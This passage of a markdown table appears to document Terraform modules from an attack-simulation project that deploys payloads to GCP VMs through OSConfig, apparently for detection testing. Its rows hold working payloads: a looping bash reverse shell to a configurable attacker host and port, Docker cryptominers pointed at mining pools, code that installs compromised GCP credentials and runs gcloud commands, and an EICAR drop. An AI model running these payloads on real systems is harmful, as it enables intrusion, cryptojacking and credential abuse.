/tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| target-osconfig-connect-reverse-shell                   | ./modules/osconfig/connect-reverse-shell              | osconfig_exec_reverse_shell                     | context.gcp.osconfig.target.connect.reverse_shell                | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "target": {<br/>                    "connect": {<br/>                        "reverse_shell": {<br/>                            "enabled": false,<br/>                            "host_ip": null,<br/>                            "host_port": 4444<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-reverse-shell              | <pre>locals &&#35;123;<br/>    host&&#35;95;ip = var&#46;inputs&&#35;91;&quot;host&&#35;95;ip&quot;&&#35;93;<br/>    host&&#35;95;port = var&#46;inputs&&#35;91;&quot;host&&#35;95;port&quot;&&#35;93;<br/><br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;attacker Host: $&&#35;123;local&#46;host&&#35;95;ip&&#35;125;:$&&#35;123;local&#46;host&&#35;95;port&&#35;125;&quot;<br/>    server=&quot;$&&#35;123;local&#46;host&&#35;95;ip&&#35;125;&quot;<br/>    timeout=600<br/>    start&&#35;95;time=$&&#35;40;date &#43;%s&&#35;41;<br/>    &#35; Check if $server is an IP address<br/>    if &&#35;91;&&#35;91; $server =~ ^&&#35;91;0&#45;9&&#35;93;&#43;&&#35;92;&#46;&&#35;91;0&#45;9&&#35;93;&#43;&&#35;92;&#46;&&#35;91;0&#45;9&&#35;93;&#43;&&#35;92;&#46;&&#35;91;0&#45;9&&#35;93;&#43;$ &&#35;93;&&#35;93;; then<br/>        log &quot;server is set to IP address $server, no need to resolve DNS&quot;<br/>    else<br/>        log &quot;checking dns resolution: $server&quot;<br/>        while true; do<br/>            ip=$&&#35;40;dig &#43;short $server&&#35;41;<br/>            if &&#35;91; &#45;z &quot;$ip&quot; &&#35;93;; then  &#35; If $ip is empty, the domain hasn&&#35;x27;t resolved yet<br/>                current&&#35;95;time=$&&#35;40;date &#43;%s&&#35;41;<br/>                elapsed&&#35;95;time=$&&#35;40;&&#35;40;current&&#35;95;time &#45; start&&#35;95;time&&#35;41;&&#35;41;<br/>                if &&#35;91; $elapsed&&#35;95;time &#45;gt $timeout &&#35;93;; then<br/>                    echo &quot;DNS resolution for $server timed out after $timeout seconds&quot;<br/>                    exit 1<br/>                fi<br/>                sleep 1<br/>            else<br/>                echo &quot;$server resolved to $ip&quot;<br/>                break<br/>            fi<br/>        done<br/>    fi<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        kill &#45;9 $&&#35;40;ps aux &#124; grep &&#35;x27;/bin/bash &#45;c bash &#45;i&&#35;x27; &#124; head &#45;1 &#124; awk &&#35;x27;&&#35;123; print $2 &&#35;125;&&#35;x27;&&#35;41;<br/>        log &quot;running: /bin/bash &#45;c &&#35;x27;bash &#45;i &gt;&amp; /dev/tcp/$&&#35;123;local&#46;host&&#35;95;ip&&#35;125;/$&&#35;123;local&#46;host&&#35;95;port&&#35;125; 0&gt;&amp;1&&#35;x27;&quot;<br/>        while &#33; /bin/bash &#45;c &&#35;x27;bash &#45;i &gt;&amp; /dev/tcp/$&&#35;123;local&#46;host&&#35;95;ip&&#35;125;/$&&#35;123;local&#46;host&&#35;95;port&&#35;125; 0&gt;&amp;1&&#35;x27;; do<br/>            log &quot;reconnecting: $&&#35;123;local&#46;host&&#35;95;ip&&#35;125;:$&&#35;123;local&#46;host&&#35;95;port&&#35;125;&quot;;<br/>            sleep 10;<br/>        done;<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| target-osconfig-drop-malware-eicar                      | ./modules/osconfig/drop-malware-eicar                 | osconfig_deploy_malware_eicar                   | context.gcp.osconfig.target.drop.malware.eicar                   | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "target": {<br/>                    "drop": {<br/>                        "malware": {<br/>                            "eicar": {<br/>                                "eicar_path": "/tmp/eicar",<br/>                                "enabled": false<br/>                            }<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/drop-malware-eicar                 | <pre>locals &&#35;123;<br/>    eicar&&#35;95;string&&#35;95;base64 = &quot;WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=&quot;<br/>    eicar&&#35;95;path = var&#46;inputs&&#35;91;&quot;eicar&&#35;95;path&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;starting script&quot;<br/>        log &quot;creating eicar file: $&&#35;123;local&#46;eicar&&#35;95;path&&#35;125;&#45;$&&#35;40;hostname&&#35;41;&quot;<br/>        rm &#45;rf $&&#35;123;local&#46;eicar&&#35;95;path&&#35;125;&&#35;42;<br/>        echo &#45;n &&#35;x27;$&&#35;123;base64decode&&#35;40;local&#46;eicar&&#35;95;string&&#35;95;base64&&#35;41;&&#35;125;&&#35;x27; &gt; $&&#35;123;local&#46;eicar&&#35;95;path&&#35;125;&#45;$&&#35;40;hostname&&#35;41;<br/>        log &quot;$&&#35;40;ls &#45;l $&&#35;123;local&#46;eicar&&#35;95;path&&#35;125;&#45;$&&#35;40;hostname&&#35;41;&&#35;41;&quot;<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/>    <br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| target-osconfig-execute-docker-cpu-miner                | ./modules/osconfig/execute-docker-cpu-miner           | osconfig_exec_docker_cpuminer                   | context.gcp.osconfig.target.execute.docker_cpu_miner             | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "target": {<br/>                    "execute": {<br/>                        "docker_cpu_miner": {<br/>                            "enabled": false,<br/>                            "minergate_image": "mkell43/minerd",<br/>                            "minergate_name": "minerd",<br/>                            "minergate_server": "stratum+tcp://eth.pool.minergate.com:45791",<br/>                            "minergate_user": null,<br/>                            "nicehash_image": "a2ncer/nheqminer_cpu:latest",<br/>                            "nicehash_name": "nicehash",<br/>                            "nicehash_server": "equihash.usa.nicehash.com:3357",<br/>                            "nicehash_user": null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                      | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-cpu-miner           | <pre>locals &&#35;123;<br/>    &#35; nicehash&&#35;95;name = var&#46;inputs&&#35;91;&quot;nicehash&&#35;95;name&quot;&&#35;93;<br/>    &#35; nicehash&&#35;95;image = var&#46;inputs&&#35;91;&quot;nicehash&&#35;95;image&quot;&&#35;93;<br/>    &#35; nicehash&&#35;95;server = var&#46;inputs&&#35;91;&quot;nicehash&&#35;95;server&quot;&&#35;93;<br/>    &#35; nicehash&&#35;95;user = var&#46;inputs&&#35;91;&quot;nicehash&&#35;95;user&quot;&&#35;93;<br/>    minergate&&#35;95;name = var&#46;inputs&&#35;91;&quot;minergate&&#35;95;name&quot;&&#35;93;<br/>    minergate&&#35;95;image = var&#46;inputs&&#35;91;&quot;minergate&&#35;95;image&quot;&&#35;93;<br/>    minergate&&#35;95;server = var&#46;inputs&&#35;91;&quot;minergate&&#35;95;server&quot;&&#35;93;<br/>    minergate&&#35;95;user=var&#46;inputs&&#35;91;&quot;minergate&&#35;95;user&quot;&&#35;93;<br/><br/>    payload = &lt;&lt;&#45;EOT<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;starting script&quot;<br/>        if &&#35;91;&&#35;91; &&#35;96;sudo docker ps &#124; grep $&&#35;123;local&#46;minergate&&#35;95;name&&#35;125;&&#35;96; &&#35;93;&&#35;93;; then docker stop $&&#35;123;local&#46;minergate&&#35;95;name&&#35;125;; fi<br/>        sudo docker run &#45;&#45;rm &#45;d &#45;&#45;network=host &#45;&#45;name $&&#35;123;local&#46;minergate&&#35;95;name&&#35;125; $&&#35;123;local&#46;minergate&&#35;95;image&&#35;125; &#45;a cryptonight &#45;o $&&#35;123;local&#46;minergate&&#35;95;server&&#35;125; &#45;u $&&#35;123; local&#46;minergate&&#35;95;user &&#35;125; &#45;p x<br/>        sudo docker ps &#45;a &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/>    <br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| target-osconfig-execute-generate-gcp-cli-traffic-target | ./modules/osconfig/execute-generate-gcp-cli-traffic   | osconfig_exec_generate_gcp_cli_traffic_target   | context.gcp.osconfig.target.execute.generate_gcp_cli_traffic     | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "target": {<br/>                    "execute": {<br/>                        "generate_gcp_cli_traffic": {<br/>                            "commands": [],<br/>                            "compromised_credentials": {},<br/>                            "compromised_keys_user": null,<br/>                            "enabled": false,<br/>                            "profile": "gcp-traffic"<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-generate-gcp-cli-traffic   | <pre>locals &&#35;123;<br/>    tool = &quot;gcloud&quot;<br/>    attack&&#35;95;dir = &quot;/generate&#45;gcp&#45;cli&#45;traffic&quot;<br/>    gcp&&#35;95;creds = try&&#35;40;var&#46;inputs&&#35;91;&quot;compromised&&#35;95;credentials&quot;&&#35;93;&&#35;91;var&#46;inputs&&#35;91;&quot;compromised&&#35;95;keys&&#35;95;user&quot;&&#35;93;&&#35;93;&#46;rendered, &quot;&quot;&&#35;41;<br/>    gcp&&#35;95;commands = join&&#35;40;&quot;&&#35;92;n&quot;, &&#35;91; for command in var&#46;inputs&&#35;91;&quot;commands&quot;&&#35;93;: &quot;$&&#35;123;command&&#35;125;&quot; &&#35;93;&&#35;41;<br/>    payload = &lt;&lt;&#45;EOT<br/>    rm &#45;rf $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    mkdir &#45;p $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    log &quot;Deploying gcp credentials&#46;&#46;&#46;&quot;<br/>    mkdir &#45;p $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/&#46;config/gcloud<br/>    if &&#35;91;  &quot;$&&#35;123; local&#46;gcp&&#35;95;creds == &quot;&quot; ? &quot;false&quot; : &quot;true&quot; &&#35;125;&quot; == &quot;true&quot; &&#35;93;; then<br/>      echo $&&#35;123;base64gzip&&#35;40;local&#46;gcp&&#35;95;creds&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/&#46;config/gcloud/credentials&#46;json<br/>      gcloud auth activate&#45;service&#45;account &#45;&#45;key&#45;file=$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/&#46;config/gcloud/credentials&#46;json<br/>    fi<br/>    log &quot;Running gcp commands&#46;&#46;&#46;&quot;<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        $&&#35;123;local&#46;gcp&&#35;95;commands&&#35;125;<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/>    <br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        while &#33; command &#45;v $&&#35;123;local&#46;tool&&#35;125; &gt; /dev/null; do<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        EOT<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        while &#33; command &#45;v $&&#35;123;local&#46;tool&&#35;125; &gt; /dev/null; do<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        EOT<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     